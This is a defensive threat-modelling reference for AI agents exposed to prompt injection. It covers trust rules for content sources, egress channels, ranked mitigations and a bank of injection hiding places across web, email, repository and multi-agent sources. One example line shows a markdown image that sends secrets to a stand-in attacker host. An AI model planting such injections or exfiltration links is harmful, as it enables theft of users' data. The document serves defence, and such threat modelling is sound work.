# agent-threat-model — reference

## The trust test for content sources

A content source is **trusted** only if every party who can write to it is already authorized to command the agent. Apply it literally; the answer is usually "untrusted".

| Source | Verdict | Why |
|---|---|---|
| Direct message from the operating user | Trusted | The writer is the principal |
| Web page fetched by the agent | Untrusted | Anyone who can publish can write |
| Retrieved document / RAG chunk | Untrusted | Trust is the *weakest* writer to the index, not the average one |
| Support ticket, PR comment, issue body | Untrusted | Any customer or contributor writes it |
| Internal wiki, shared drive | Untrusted | Large writer set, no authorization link to the agent |
| Email, calendar invite | Untrusted | Anyone with the address can inject |
| Tool result from an external API | Untrusted | The API's data came from somewhere |
| Subagent output | Inherits | Untrusted if that subagent read anything untrusted |
| The agent's own earlier turn | Inherits | Untrusted once untrusted content has entered the window |
| Repo source code | Depends | Trusted iff merges are reviewed by people authorized to command the agent |

**The inheritance rule is the one that bites.** Trust does not reset between turns or across a subagent boundary. Once untrusted tokens land in a context, everything downstream of that context is untrusted.

## Egress catalog — the step 1 sweep

Egress is any channel that moves bytes to somewhere the attacker can observe. Sweep all of these; a model that stops at the HTTP tool has failed.

**Obvious**
- HTTP/fetch/browser tools — arbitrary URL is total egress; query strings and paths carry payload
- Email, Slack, SMS, webhook, and notification tools
- Write tools against shared systems: PR comments, issue updates, calendar entries, CRM records

**Rendered — no network tool required**
- Markdown images: `![](https://attacker/?d=<secrets>)` — the *client* fetches it, not the agent
- Autolinked URLs the user is likely to click
- HTML/iframe/CSS in any surface that renders agent output rich
- Citation and preview cards that fetch remote metadata

**Indirect**
- File writes into a synced or published directory (cloud drive, `docs/`, a static site, a public bucket)
- `git push`, branch creation, CI trigger — the pipeline logs are often world-readable
- DNS lookups from any hostname the agent controls
- Error messages and stack traces surfaced to an untrusted reporter
- Logs, traces, and telemetry the attacker can query — including LLM-provider request logs on a shared account
- Writing into the retrieval index the attacker can later query
- Long-lived memory or scratchpad files read by a differently-scoped session

**Human-mediated**
- Any output the operator will paste elsewhere
- Approval dialogs that show a truncated payload — the human approves what they can see

## Ranked mitigation menu

Pick the highest one that fits. Lower entries are defense in depth and **never** count as breaking a leg on their own.

1. **Split the agent (quarantine pattern).** The agent that reads untrusted content holds no privileged tools and no egress; it returns *data*, not actions. A separate, privileged agent acts only on structured, validated output — never on free text it did not produce. Breaks the leg architecturally; see `subagent-design` for the topology.
2. **Remove the tool or the source.** The cheapest fix nobody proposes. If the agent doesn't need filesystem access to triage tickets, delete it.
3. **Narrow the credential.** Scope tokens per tenant, per prefix, per repo. Cuts *reach*, shrinking the private-data leg rather than removing it — state what remains.
4. **Allowlist egress.** Fixed destinations only: no arbitrary URLs, no remote image rendering, no free-form recipients. Verify by attempting an off-list destination and observing the denial.
5. **Human gate on the acting step.** Counts only when the human sees the **rendered payload and destination**, not the tool name. Specify what the approval screen shows.
6. **Structured output contracts.** The privileged step accepts an enum or a typed object, never a natural-language instruction — an attacker who controls text cannot express an action outside the schema.
7. **Sanitize / strip at the boundary.** Remove image tags, links, and control sequences from untrusted content. Defense in depth.
8. **Injection classifiers.** Raise attacker cost. Never a broken leg — they fail against novel phrasings and encodings.

## Injection vector bank per source type

Prompts to run each source against when enumerating paths:

- **Web / retrieval** — instructions in HTML comments, `alt` text, white-on-white text, PDF metadata, or a page section only the agent reads; poisoned documents planted where the retriever will rank them
- **Documents / spreadsheets** — hidden sheets, cell comments, revision history, embedded objects
- **Email / calendar** — instructions in a signature, an `.ics` description, or a quoted reply chain
- **Code / repos** — a comment in a dependency, a README the agent reads for context, a test fixture, a commit message
- **Tickets / PRs** — the body, a label, an attachment filename, an author display name
- **Tool results** — an error string echoed from a remote service, a paginated field the agent concatenates
- **Multi-agent** — a subagent that has read untrusted content reporting to a privileged orchestrator; the orchestrator treats the report as instruction

## Severity markers

| Marker | Meaning |
|---|---|
| 🟥 | All three legs on one path with no control — data theft is a design property |
| 🟧 | All three legs, held only by a human gate or an allowlist — the control is load-bearing and must be named and verified |
| 🟨 | Two legs; the third arrives with a plausible change (a new tool, a widened credential) |
| ⚪ | One leg, or explicitly accepted by a named owner with a revisit trigger |
